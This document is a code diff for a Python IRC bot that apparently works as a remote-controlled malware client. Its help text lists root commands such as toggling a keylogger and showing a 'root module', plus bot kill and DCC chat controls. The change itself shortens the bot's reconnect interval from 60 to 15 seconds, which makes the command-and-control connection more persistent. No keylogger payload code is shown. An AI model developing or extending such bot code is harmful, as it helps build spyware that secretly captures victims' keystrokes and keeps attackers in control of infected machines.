@@ -12,7 +12,7 @@ Bot commands are:
     BOT COMMANDS --------
     stats -- Print some channel information.
     disconnect -- Disconnect the bot. The bot will try to reconnect
-                  after 60 seconds.
+                  after 15 seconds.
     die -- Kill the bot.
     -------dcc -- Command a bot DCC CHAT invite connection.
 
@@ -43,7 +43,7 @@ debug = True
 
 class Bot(irc.bot.SingleServerIRCBot):
     def __init__(self, channel, nickname, server, port=6667):
-        irc.bot.SingleServerIRCBot.__init__(self, [(server, port)], nickname, nickname)
+        irc.bot.SingleServerIRCBot.__init__(self, [(server, port)], nickname, nickname, reconnection_interval=15)
         self.channel = channel
     	self.valid_cmds = ["sp", "tls", "thf", "mh", "ms"] 
 
@@ -121,7 +121,7 @@ class Bot(irc.bot.SingleServerIRCBot):
 
     def _cmd_disconnect(self, c, e, cmd, nick):
 	if debug:
-	    print "Disconnecting. Will attempt reconnect in 60 seconds..."
+	    print "Disconnecting. Will attempt reconnect in 15 seconds..."
         self.disconnect()
 
     def _cmd_die(self, c, e, cmd, nick):
@@ -157,7 +157,7 @@ class Bot(irc.bot.SingleServerIRCBot):
 BOT COMMANDS --------
 stats -- Print some channel information.
 disconnect -- Disconnect the bot. The bot will try to reconnect
-              after 60 seconds.
+              after 15 seconds.
 die -- Kill the bot.
 
 ROOT COMMANDS -------
@@ -172,7 +172,7 @@ ms -- Show the root module.
 """
         c.notice(channel, "BOT COMMANDS --------")
         c.notice(channel, "stats -- Print some channel information.")
-        c.notice(channel, "disconnect -- Disconnect the bot. The bot will try to reconnect after 60 seconds.")
+        c.notice(channel, "disconnect -- Disconnect the bot. The bot will try to reconnect after 15 seconds.")
         c.notice(channel, "die -- Kill the bot.")
         c.notice(channel, "ROOT COMMANDS -------")
         c.notice(channel, "tls -- Toggle keylogger on/off (default is off).")
